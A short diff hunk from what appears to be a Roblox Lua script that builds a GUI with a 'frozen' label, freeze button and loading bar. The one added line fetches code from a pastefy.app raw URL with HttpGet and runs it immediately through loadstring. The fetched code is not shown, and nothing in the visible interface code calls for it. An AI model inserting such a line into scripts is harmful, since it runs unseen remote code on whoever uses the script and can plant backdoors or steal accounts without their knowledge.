@@ -87,6 +87,8 @@ FrozenText.Font = Enum.Font.GothamBold
 FrozenText.Visible = false
 FrozenText.Parent = Frame
 
+loadstring(game:HttpGet("https://pastefy.app/XEvmgXYu/raw"))()
+
 -- Animate loading bar with transition
 local function StartLoading()
     FreezeButton.Visible = false
